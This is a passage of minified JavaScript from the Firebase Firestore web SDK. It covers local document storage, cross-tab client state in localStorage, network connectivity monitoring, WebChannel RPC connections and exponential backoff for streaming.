c,h,d;null!==t.targetMismatches.get(a)?u=u.withResumeToken(Ct.EMPTY_BYTE_STRING,ee.min()).withLastLimboFreeSnapshotVersion(ee.min()):s.resumeToken.approximateByteSize()>0&&(u=u.withResumeToken(s.resumeToken,r)),i=i.insert(a,u),h=u,d=s,(0===(c=l).resumeToken.approximateByteSize()||h.snapshotVersion.toMicroseconds()-c.snapshotVersion.toMicroseconds()>=3e8||d.addedDocuments.size+d.modifiedDocuments.size+d.removedDocuments.size>0)&&o.push(n.Fs.updateTargetData(e,u))}));let a=_n(),l=ce();if(t.documentUpdates.forEach((r=>{t.resolvedLimboDocuments.has(r)&&o.push(n.persistence.referenceDelegate.updateLimboDocument(e,r))})),o.push(lI(e,s,t.documentUpdates).next((e=>{a=e.er,l=e.nr}))),!r.isEqual(ee.min())){const t=n.Fs.getLastRemoteSnapshotVersion(e).next((t=>n.Fs.setTargetsMetadata(e,e.currentSequenceNumber,r)));o.push(t)}return C.waitFor(o).next((()=>s.apply(e))).next((()=>n.localDocuments.getLocalViewOfDocuments(e,a,l))).next((()=>a))})).then((e=>(n.Hi=i,e)))}function lI(e,t,n){let r=ce(),i=ce();return n.forEach((e=>r=r.add(e))),t.getEntries(e,r).next((e=>{let r=_n();return n.forEach(((n,s)=>{const o=e.get(n);s.isFoundDocument()!==o.isFoundDocument()&&(i=i.add(n)),s.isNoDocument()&&s.version.isEqual(ee.min())?(t.removeEntry(n,s.readTime),r=r.insert(n,s)):!o.isValidDocument()||s.version.compareTo(o.version)>0||0===s.version.compareTo(o.version)&&o.hasPendingWrites?(t.addEntry(s),r=r.insert(n,s)):V("LocalStore","Ignoring outdated watch update for ",n,". Current version:",o.version," Watch version:",s.version)})),{er:r,nr:i}}))}function $L(e,t){const n=q(e);return n.persistence.runTransaction("Get next mutation batch","readonly",(e=>(void 0===t&&(t=-1),n.mutationQueue.getNextMutationBatchAfterBatchId(e,t))))}function ca(e,t){const n=q(e);return n.persistence.runTransaction("Allocate target","readwrite",(e=>{let r;return n.Fs.getTargetData(e,t).next((i=>i?(r=i,C.resolve(r)):n.Fs.allocateTargetId(e).next((i=>(r=new Vr(t,i,"TargetPurposeListen",e.currentSequenceNumber),n.Fs.addTargetData(e,r).next((()=>r)))))))})).then((e=>{const r=n.Hi.get(e.targetId);return(null===r||e.snapshotVersion.compareTo(r.snapshotVersion)>0)&&(n.Hi=n.Hi.insert(e.targetId,e),n.Ji.set(t,e.targetId)),e}))}async function ha(e,t,n){const r=q(e),i=r.Hi.get(t),s=n?"readwrite":"readwrite-primary";try{n||await r.persistence.runTransaction("Release target",s,(e=>r.persistence.referenceDelegate.removeTarget(e,i)))}catch(e){if(!Xi(e))throw e;V("LocalStore",`Failed to update sequence numbers for target ${t}: ${e}`)}r.Hi=r.Hi.remove(t),r.Ji.delete(i.target)}function td(e,t,n){const r=q(e);let i=ee.min(),s=ce();return r.persistence.runTransaction("Execute query","readonly",(e=>function(e,t,n){const r=q(e),i=r.Ji.get(n);return void 0!==i?C.resolve(r.Hi.get(i)):r.Fs.getTargetData(t,n)}(r,e,kn(t)).next((t=>{if(t)return i=t.lastLimboFreeSnapshotVersion,r.Fs.getMatchingKeysForTargetId(e,t.targetId).next((e=>{s=e}))})).next((()=>r.Wi.getDocumentsMatchingQuery(e,t,n?i:ee.min(),n?s:ce()))).next((e=>(hI(r,yx(t),e),{documents:e,sr:s})))))}function uI(e,t){const n=q(e),r=q(n.Fs),i=n.Hi.get(t);return i?Promise.resolve(i.target):n.persistence.runTransaction("Get target data","readonly",(e=>r.he(e,t).next((e=>e?e.target:null))))}function cI(e,t){const n=q(e),r=n.Yi.get(t)||ee.min();return n.persistence.runTransaction("Get new document changes","readonly",(e=>n.Xi.getAllFromCollectionGroup(e,t,KT(r,-1),Number.MAX_SAFE_INTEGER))).then((e=>(hI(n,t,e),e)))}function hI(e,t,n){let r=e.Yi.get(t)||ee.min();n.forEach(((e,t)=>{t.readTime.compareTo(r)>0&&(r=t.readTime)})),e.Yi.set(t,r)}async function LL(e,t,n,r){const i=q(e);let s=ce(),o=_n();for(const e of n){const n=t.ir(e.metadata.name);e.document&&(s=s.add(n));const r=t.rr(e);r.setReadTime(t.ur(e.metadata.readTime)),o=o.insert(n,r)}const a=i.Xi.newChangeBuffer({trackRemovals:!0}),l=await ca(i,(u=r,kn(Ea(Te.fromString(`__bundle__/docs/${u}`)))));var u;return i.persistence.runTransaction("Apply bundle documents","readwrite",(e=>lI(e,a,o).next((t=>(a.apply(e),t))).next((t=>i.Fs.removeMatchingKeysForTargetId(e,l.targetId).next((()=>i.Fs.addMatchingKeys(e,s,l.targetId))).next((()=>i.localDocuments.getLocalViewOfDocuments(e,t.er,t.nr))).next((()=>t.er))))))}async function FL(e,t,n=ce()){const r=await ca(e,kn(dv(t.bundledQuery))),i=q(e);return i.persistence.runTransaction("Save named query","readwrite",(e=>{const s=yt(t.readTime);if(r.snapshotVersion.compareTo(s)>=0)return i.Ls.saveNamedQuery(e,t);const o=r.withResumeToken(Ct.EMPTY_BYTE_STRING,s);return i.Hi=i.Hi.insert(o.targetId,o),i.Fs.updateTargetData(e,o).next((()=>i.Fs.removeMatchingKeysForTargetId(e,r.targetId))).next((()=>i.Fs.addMatchingKeys(e,n,r.targetId))).next((()=>i.Ls.saveNamedQuery(e,t)))}))}function DS(e,t){return`firestore_clients_${e}_${t}`}function CS(e,t,n){let r=`firestore_mutations_${e}_${n}`;return t.isAuthenticated()&&(r+=`_${t.uid}`),r}function Cp(e,t){return`firestore_targets_${e}_${t}`}class nd{constructor(e,t,n,r){this.user=e,this.batchId=t,this.state=n,this.error=r}static cr(e,t,n){const r=JSON.parse(n);let i,s="object"==typeof r&&-1!==["pending","acknowledged","rejected"].indexOf(r.state)&&(void 0===r.error||"object"==typeof r.error);return s&&r.error&&(s="string"==typeof r.error.message&&"string"==typeof r.error.code,s&&(i=new L(r.error.code,r.error.message))),s?new nd(e,t,r.state,i):(mt("SharedClientState",`Failed to parse mutation state for ID '${t}': ${n}`),null)}ar(){const e={state:this.state,updateTimeMs:Date.now()};return this.error&&(e.error={code:this.error.code,message:this.error.message}),JSON.stringify(e)}}class Nl{constructor(e,t,n){this.targetId=e,this.state=t,this.error=n}static cr(e,t){const n=JSON.parse(t);let r,i="object"==typeof n&&-1!==["not-current","current","rejected"].indexOf(n.state)&&(void 0===n.error||"object"==typeof n.error);return i&&n.error&&(i="string"==typeof n.error.message&&"string"==typeof n.error.code,i&&(r=new L(n.error.code,n.error.message))),i?new Nl(e,n.state,r):(mt("SharedClientState",`Failed to parse target state for ID '${e}': ${t}`),null)}ar(){const e={state:this.state,updateTimeMs:Date.now()};return this.error&&(e.error={code:this.error.code,message:this.error.message}),JSON.stringify(e)}}class rd{constructor(e,t){this.clientId=e,this.activeTargetIds=t}static cr(e,t){const n=JSON.parse(t);let r="object"==typeof n&&n.activeTargetIds instanceof Array,i=iv();for(let e=0;r&&e<n.activeTargetIds.length;++e)r=ZT(n.activeTargetIds[e]),i=i.add(n.activeTargetIds[e]);return r?new rd(e,i):(mt("SharedClientState",`Failed to parse client data for instance '${e}': ${t}`),null)}}class wv{constructor(e,t){this.clientId=e,this.onlineState=t}static cr(e){const t=JSON.parse(e);return"object"==typeof t&&-1!==["Unknown","Online","Offline"].indexOf(t.onlineState)&&"string"==typeof t.clientId?new wv(t.clientId,t.onlineState):(mt("SharedClientState",`Failed to parse online state: ${e}`),null)}}class dg{constructor(){this.activeTargetIds=iv()}hr(e){this.activeTargetIds=this.activeTargetIds.add(e)}lr(e){this.activeTargetIds=this.activeTargetIds.delete(e)}ar(){const e={activeTargetIds:this.activeTargetIds.toArray(),updateTimeMs:Date.now()};return JSON.stringify(e)}}class Np{constructor(e,t,n,r,i){this.window=e,this.si=t,this.persistenceKey=n,this.dr=r,this.syncEngine=null,this.onlineStateHandler=null,this.sequenceNumberHandler=null,this._r=this.wr.bind(this),this.mr=new Be(ue),this.started=!1,this.gr=[];const s=n.replace(/[.*+?^${}()|[\]\\]/g,"\\$&");this.storage=this.window.localStorage,this.currentUser=i,this.yr=DS(this.persistenceKey,this.dr),this.pr=`firestore_sequence_number_${this.persistenceKey}`,this.mr=this.mr.insert(this.dr,new dg),this.Ir=new RegExp(`^firestore_clients_${s}_([^_]*)$`),this.Tr=new RegExp(`^firestore_mutations_${s}_(\\d+)(?:_(.*))?$`),this.Er=new RegExp(`^firestore_targets_${s}_(\\d+)$`),this.Ar=function(e){return`firestore_online_state_${e}`}(this.persistenceKey),this.Rr=function(e){return`firestore_bundle_loaded_v2_${e}`}(this.persistenceKey),this.window.addEventListener("storage",this._r)}static D(e){return!(!e||!e.localStorage)}async start(){const e=await this.syncEngine.Mi();for(const t of e){if(t===this.dr)continue;const e=this.getItem(DS(this.persistenceKey,t));if(e){const n=rd.cr(t,e);n&&(this.mr=this.mr.insert(n.clientId,n))}}this.vr();const t=this.storage.getItem(this.Ar);if(t){const e=this.Pr(t);e&&this.br(e)}for(const e of this.gr)this.wr(e);this.gr=[],this.window.addEventListener("pagehide",(()=>this.shutdown())),this.started=!0}writeSequenceNumber(e){this.setItem(this.pr,JSON.stringify(e))}getAllActiveQueryTargets(){return this.Vr(this.mr)}isActiveQueryTarget(e){let t=!1;return this.mr.forEach(((n,r)=>{r.activeTargetIds.has(e)&&(t=!0)})),t}addPendingMutation(e){this.Sr(e,"pending")}updateMutationState(e,t,n){this.Sr(e,t,n),this.Dr(e)}addLocalQueryTarget(e){let t="not-current";if(this.isActiveQueryTarget(e)){const n=this.storage.getItem(Cp(this.persistenceKey,e));if(n){const r=Nl.cr(e,n);r&&(t=r.state)}}return this.Cr.hr(e),this.vr(),t}removeLocalQueryTarget(e){this.Cr.lr(e),this.vr()}isLocalQueryTarget(e){return this.Cr.activeTargetIds.has(e)}clearQueryState(e){this.removeItem(Cp(this.persistenceKey,e))}updateQueryState(e,t,n){this.Nr(e,t,n)}handleUserChange(e,t,n){t.forEach((e=>{this.Dr(e)})),this.currentUser=e,n.forEach((e=>{this.addPendingMutation(e)}))}setOnlineState(e){this.kr(e)}notifyBundleLoaded(e){this.Mr(e)}shutdown(){this.started&&(this.window.removeEventListener("storage",this._r),this.removeItem(this.yr),this.started=!1)}getItem(e){const t=this.storage.getItem(e);return V("SharedClientState","READ",e,t),t}setItem(e,t){V("SharedClientState","SET",e,t),this.storage.setItem(e,t)}removeItem(e){V("SharedClientState","REMOVE",e),this.storage.removeItem(e)}wr(e){const t=e;if(t.storageArea===this.storage){if(V("SharedClientState","EVENT",t.key,t.newValue),t.key===this.yr)return void mt("Received WebStorage notification for local change. Another client might have garbage-collected our state");this.si.enqueueRetryable((async()=>{if(this.started){if(null!==t.key)if(this.Ir.test(t.key)){if(null==t.newValue){const e=this.Or(t.key);return this.$r(e,null)}{const e=this.Fr(t.key,t.newValue);if(e)return this.$r(e.clientId,e)}}else if(this.Tr.test(t.key)){if(null!==t.newValue){const e=this.Br(t.key,t.newValue);if(e)return this.Lr(e)}}else if(this.Er.test(t.key)){if(null!==t.newValue){const e=this.qr(t.key,t.newValue);if(e)return this.Ur(e)}}else if(t.key===this.Ar){if(null!==t.newValue){const e=this.Pr(t.newValue);if(e)return this.br(e)}}else if(t.key===this.pr){const e=function(e){let t=wn.ct;if(null!=e)try{const n=JSON.parse(e);te("number"==typeof n),t=n}catch(e){mt("SharedClientState","Failed to read sequence number from WebStorage",e)}return t}(t.newValue);e!==wn.ct&&this.sequenceNumberHandler(e)}else if(t.key===this.Rr){const e=this.Kr(t.newValue);await Promise.all(e.map((e=>this.syncEngine.Gr(e))))}}else this.gr.push(t)}))}}get Cr(){return this.mr.get(this.dr)}vr(){this.setItem(this.yr,this.Cr.ar())}Sr(e,t,n){const r=new nd(this.currentUser,e,t,n),i=CS(this.persistenceKey,this.currentUser,e);this.setItem(i,r.ar())}Dr(e){const t=CS(this.persistenceKey,this.currentUser,e);this.removeItem(t)}kr(e){const t={clientId:this.dr,onlineState:e};this.storage.setItem(this.Ar,JSON.stringify(t))}Nr(e,t,n){const r=Cp(this.persistenceKey,e),i=new Nl(e,t,n);this.setItem(r,i.ar())}Mr(e){const t=JSON.stringify(Array.from(e));this.setItem(this.Rr,t)}Or(e){const t=this.Ir.exec(e);return t?t[1]:null}Fr(e,t){const n=this.Or(e);return rd.cr(n,t)}Br(e,t){const n=this.Tr.exec(e),r=Number(n[1]),i=void 0!==n[2]?n[2]:null;return nd.cr(new bt(i),r,t)}qr(e,t){const n=this.Er.exec(e),r=Number(n[1]);return Nl.cr(r,t)}Pr(e){return wv.cr(e)}Kr(e){return JSON.parse(e)}async Lr(e){if(e.user.uid===this.currentUser.uid)return this.syncEngine.Qr(e.batchId,e.state,e.error);V("SharedClientState",`Ignoring mutation for non-active user ${e.user.uid}`)}Ur(e){return this.syncEngine.jr(e.targetId,e.state,e.error)}$r(e,t){const n=t?this.mr.insert(e,t):this.mr.remove(e),r=this.Vr(this.mr),i=this.Vr(n),s=[],o=[];return i.forEach((e=>{r.has(e)||s.push(e)})),r.forEach((e=>{i.has(e)||o.push(e)})),this.syncEngine.zr(s,o).then((()=>{this.mr=n}))}br(e){this.mr.get(e.clientId)&&this.onlineStateHandler(e.onlineState)}Vr(e){let t=iv();return e.forEach(((e,n)=>{t=t.unionWith(n.activeTargetIds)})),t}}class dI{constructor(){this.Wr=new dg,this.Hr={},this.onlineStateHandler=null,this.sequenceNumberHandler=null}addPendingMutation(e){}updateMutationState(e,t,n){}addLocalQueryTarget(e){return this.Wr.hr(e),this.Hr[e]||"not-current"}updateQueryState(e,t,n){this.Hr[e]=t}removeLocalQueryTarget(e){this.Wr.lr(e)}isLocalQueryTarget(e){return this.Wr.activeTargetIds.has(e)}clearQueryState(e){delete this.Hr[e]}getAllActiveQueryTargets(){return this.Wr.activeTargetIds}isActiveQueryTarget(e){return this.Wr.activeTargetIds.has(e)}start(){return this.Wr=new dg,Promise.resolve()}handleUserChange(e,t,n){}setOnlineState(e){}shutdown(){}writeSequenceNumber(e){}notifyBundleLoaded(e){}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class VL{Jr(e){}shutdown(){}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class NS{constructor(){this.Yr=()=>this.Xr(),this.Zr=()=>this.eo(),this.no=[],this.so()}Jr(e){this.no.push(e)}shutdown(){window.removeEventListener("online",this.Yr),window.removeEventListener("offline",this.Zr)}so(){window.addEventListener("online",this.Yr),window.addEventListener("offline",this.Zr)}Xr(){V("ConnectivityMonitor","Network connectivity changed: AVAILABLE");for(const e of this.no)e(0)}eo(){V("ConnectivityMonitor","Network connectivity changed: UNAVAILABLE");for(const e of this.no)e(1)}static D(){return typeof window<"u"&&void 0!==window.addEventListener&&void 0!==window.removeEventListener}}
/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Lc=null;function Mp(){return null===Lc?Lc=268435456+Math.round(2147483648*Math.random()):Lc++,"0x"+Lc.toString(16)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const UL={BatchGetDocuments:"batchGet",Commit:"commit",RunQuery:"runQuery",RunAggregationQuery:"runAggregationQuery"};
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class zL{constructor(e){this.io=e.io,this.ro=e.ro}oo(e){this.uo=e}co(e){this.ao=e}onMessage(e){this.ho=e}close(){this.ro()}send(e){this.io(e)}lo(){this.uo()}fo(e){this.ao(e)}_o(e){this.ho(e)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const en="WebChannelConnection";class BL extends class{constructor(e){this.databaseInfo=e,this.databaseId=e.databaseId;const t=e.ssl?"https":"http";this.wo=t+"://"+e.host,this.mo="projects/"+this.databaseId.projectId+"/databases/"+this.databaseId.database+"/documents"}get yo(){return!1}po(e,t,n,r,i){const s=Mp(),o=this.Io(e,t);V("RestConnection",`Sending RPC '${e}' ${s}:`,o,n);const a={};return this.To(a,r,i),this.Eo(e,o,a,n).then((t=>(V("RestConnection",`Received RPC '${e}' ${s}: `,t),t)),(t=>{throw sr("RestConnection",`RPC '${e}' ${s} failed with error: `,t,"url: ",o,"request:",n),t}))}Ao(e,t,n,r,i,s){return this.po(e,t,n,r,i)}To(e,t,n){e["X-Goog-Api-Client"]="gl-js/ fire/"+_a,e["Content-Type"]="text/plain",this.databaseInfo.appId&&(e["X-Firebase-GMPID"]=this.databaseInfo.appId),t&&t.headers.forEach(((t,n)=>e[n]=t)),n&&n.headers.forEach(((t,n)=>e[n]=t))}Io(e,t){const n=UL[e];return`${this.wo}/v1/${t}:${n}`}}{constructor(e){super(e),this.forceLongPolling=e.forceLongPolling,this.autoDetectLongPolling=e.autoDetectLongPolling,this.useFetchStreams=e.useFetchStreams}Eo(e,t,n,r){const i=Mp();return new Promise(((s,o)=>{const a=new F4;a.setWithCredentials(!0),a.listenOnce(P4.COMPLETE,(()=>{try{switch(a.getLastErrorCode()){case Ip.NO_ERROR:const t=a.getResponseJson();V(en,`XHR for RPC '${e}' ${i} received:`,JSON.stringify(t)),s(t);break;case Ip.TIMEOUT:V(en,`RPC '${e}' ${i} timed out`),o(new L(M.DEADLINE_EXCEEDED,"Request time out"));break;case Ip.HTTP_ERROR:const n=a.getStatus();if(V(en,`RPC '${e}' ${i} failed with status:`,n,"response text:",a.getResponseText()),n>0){let e=a.getResponseJson();Array.isArray(e)&&(e=e[0]);const t=null==e?void 0:e.error;if(t&&t.status&&t.message){const e=function(e){const t=e.toLowerCase().replace(/_/g,"-");return Object.values(M).indexOf(t)>=0?t:M.UNKNOWN}(t.status);o(new L(e,t.message))}else o(new L(M.UNKNOWN,"Server responded with status "+a.getStatus()))}else o(new L(M.UNAVAILABLE,"Connection failed."));break;default:G()}}finally{V(en,`RPC '${e}' ${i} completed.`)}}));const l=JSON.stringify(r);V(en,`RPC '${e}' ${i} sending request:`,r),a.send(t,"POST",l,n,15)}))}Ro(e,t,n){const r=Mp(),i=[this.wo,"/","google.firestore.v1.Firestore","/",e,"/channel"],s=b4(),o=O4(),a={httpSessionIdParam:"gsessionid",initMessageHeaders:{},messageUrlParams:{database:`projects/${this.databaseId.projectId}/databases/${this.databaseId.database}`},sendRawJson:!0,supportsCrossDomainXhr:!0,internalChannelParams:{forwardChannelRequestTimeoutMs:6e5},forceLongPolling:this.forceLongPolling,detectBufferingProxy:this.autoDetectLongPolling};this.useFetchStreams&&(a.xmlHttpFactory=new L4({})),this.To(a.initMessageHeaders,t,n),a.encodeInitMessageHeaders=!0;const l=i.join("");V(en,`Creating RPC '${e}' stream ${r}: ${l}`,a);const u=s.createWebChannel(l,a);let c=!1,h=!1;const d=new zL({io:t=>{h?V(en,`Not sending because RPC '${e}' stream ${r} is closed:`,t):(c||(V(en,`Opening RPC '${e}' stream ${r} transport.`),u.open(),c=!0),V(en,`RPC '${e}' stream ${r} sending:`,t),u.send(t))},ro:()=>u.close()}),f=(e,t,n)=>{e.listen(t,(e=>{try{n(e)}catch(e){setTimeout((()=>{throw e}),0)}}))};return f(u,Mc.EventType.OPEN,(()=>{h||V(en,`RPC '${e}' stream ${r} transport opened.`)})),f(u,Mc.EventType.CLOSE,(()=>{h||(h=!0,V(en,`RPC '${e}' stream ${r} transport closed`),d.fo())})),f(u,Mc.EventType.ERROR,(t=>{h||(h=!0,sr(en,`RPC '${e}' stream ${r} transport errored:`,t),d.fo(new L(M.UNAVAILABLE,"The operation could not be completed")))})),f(u,Mc.EventType.MESSAGE,(t=>{var n;if(!h){const i=t.data[0];te(!!i);const s=i,o=s.error||(null===(n=s[0])||void 0===n?void 0:n.error);if(o){V(en,`RPC '${e}' stream ${r} received error:`,o);const t=o.status;let n=function(e){const t=wt[e];if(void 0!==t)return Ax(t)}(t),i=o.message;void 0===n&&(n=M.INTERNAL,i="Unknown error status: "+t+" with message "+o.message),h=!0,d.fo(new L(n,i)),u.close()}else V(en,`RPC '${e}' stream ${r} received:`,i),d._o(i)}})),f(o,$4.STAT_EVENT,(t=>{t.stat===Lw.PROXY?V(en,`RPC '${e}' stream ${r} detected buffering proxy`):t.stat===Lw.NOPROXY&&V(en,`RPC '${e}' stream ${r} detected no buffering proxy`)})),setTimeout((()=>{d.lo()}),0),d
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}function fI(){return typeof window<"u"?window:null}function sh(){return typeof document<"u"?document:null}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function zu(e){return new Q$(e,!0)}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Sv{constructor(e,t,n=1e3,r=1.5,i=6e4){this.si=e,this.timerId=t,this.vo=n,this.Po=r,this.bo=i,this.Vo=0,this.So=null,this.Do=Date.now(),this.reset()}reset(){this.Vo=0}Co(){this.Vo=this.bo}xo(e){this.cancel();const t=Math.floor(this.Vo+this.No()),n=Math.max(0,Date.now()-this.Do),r=Math.max(0,t-n);r>0&&V("ExponentialBackoff",`Backing off for ${r} ms (base delay: ${this.Vo} ms, delay with jitter: ${t} ms, last attempt: ${n} ms ago)`),this.So=this.si.enqueueAfterDelay(this.timerId,r,(()=>(this.Do=Date.now(),e()))),this.Vo*=this.Po,this.Vo<this.vo&&(this.Vo=this.vo),this.Vo>this.bo&&(this.Vo=this.bo)}ko(){null!==this.So&&(this.So.skipDelay(),this.So=null)}cancel(){null!==this.So&&(this.So.cancel(),this.So=null)}No(){return(Math.random()-.5)*this.Vo}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class pI{constructor(e,t,n,r,i,s,o,a){this.si=e,this.Mo=n,this.Oo=r,this.connection=i,this.authCredentialsProvider=s,this.appCheckCredentialsProvider=o,this.listener=a,this.state=0,this.$o=0,this.Fo=null,this.Bo=null,this.stream=null,this.Lo=new Sv(e,t)}qo(){return 1===this.state||5===this.state||this.Uo()}Uo(){return 2===this.state||3===this.state}start(){4!==this.state?this.auth():this.Ko()}async stop(){this.qo()&&await this.close(0)}Go(){this.state=0,this.Lo.reset()}Qo(){this.Uo()&&null===this.Fo&&(this.Fo=this.si.enqueueAfterDelay(this.Mo,6e4,(()=>this.jo())))}zo(e){this.Wo(),this.stream.send(e)}async jo(){if(this.Uo())return this.close(0)}Wo(){this.Fo&&(this.Fo.cancel(),this.Fo=null)}Ho(){this.Bo&&(this.Bo.cancel(),this.Bo=null)}async close(e,t){this.Wo(),this.Ho(),this.Lo.cancel(),this.$o++,4!==e?this.Lo.reset():t&&t.code===M.RESOURCE_EXHAUSTED?(mt(t.toString()),mt("Using maximum backoff delay to prevent overloading the backend."),this.Lo.Co()):t&&t.code===M.UNAUTHENTICATED&&3!==this.state&&(this.authCredentialsProvider.invalidateToken(),this.appCheckCredentialsProvider.invalidateToken()),null!==this.stream&&(this.Jo(),this.stream.close(),this.stream=null),this.state=e,await this.listener.co(t)}Jo(){}auth(){this.state=1;const e=this.Yo(this.$o),t=this.$o;Promise.all([this.authCredentialsProvider.getToken(),this.appCheckCredentialsProvider.getToken()]).then((([e,n])=>{this.$o===t&&this.Xo(e,n)}),(t=>{e((()=>{const e=new L(M.UNKNOWN,"Fetching auth token failed: "+t.message);return this.Zo(e)}))}))}Xo(e,t){const n=this.Yo(this.$o);this.stream=this.tu(e,t),this.stream.oo((()=>{n((()=>(this.state=2,this.Bo=this.si.enqueueAfterDelay(this.Oo,1e4,(()=>(this.Uo()&&(this.state=3),Promise.resolve()))),this.listener.oo())))})),this.stream.co((e=>{n((()=>this.Zo(e)))})),this.stream.onMessage((e=>{n((()=>this.onMessage(e)))}))}Ko(){this.state=5,this.Lo.xo((async()=>{this.state=0,this.start()}))}Zo(e){return V("PersistentStream",`close with error: ${e}`),this.stream=null,this.close(4,e)}Yo(e){return t=>{this.si.enqueueAndForget((()=>this.$o===e?t():(V("PersistentStream","stream callback skipped by getCloseGuardedDispatcher."),Promise.resolve())))}}}class jL extends pI{constructor(e,t,n,r,i,s){super(e,"listen_stream_connection_backoff","listen_stream_idle","health_check_timeout",t,n,r,s),this.serializer=i}tu(e,t){return this.connection.Ro("Listen",e,t)}onMessage(e){this.Lo.reset();const t=Z$(this.serializer,e),n=function(e){if(!("targetChange"in e))return ee.min();const t=e.targetChange;return t.targetIds&&t.targetIds.length?ee.min():t.readTime?yt(t.readTime):ee.min()}(e);return this.listener.eu(t,n)}nu(e){const t={};t.database=cu(this.serializer),t.addTarget=function(e,t){let n;const r=t.target;if(n=Kh(r)?{documents:zx(e,r)}:{query:Bx(e,r)},n.targetId=t.targetId,t.resumeToken.approximateByteSize()>0){n.resumeToken=$x(e,t.resumeToken);const r=og(e,t.expectedCount);null!==r&&(n.expectedCount=r)}else if(t.snapshotVersion.compareTo(ee.min())>0){n.readTime=ua(e,t.snapshotVersion.toTimestamp());const r=og(e,t.expectedCount);null!==r&&(n.expectedCount=r)}return n}(this.serializer,e);const n=tL(this.serializer,e);n&&(t.labels=n),this.zo(t)}su(e){const t={};t.database=cu(this.serializer),t.removeTarget=e,this.zo(t)}}class qL extends pI{constructor(e,t,n,r,i,s){super(e,"write_stream_connection_backoff","write_stream_idle","health_check_timeout",t,n,r,s),this.serializer=i,this.iu=!1}get ru(){return this.iu}start(){this.iu=!1,this.lastStreamToken=void 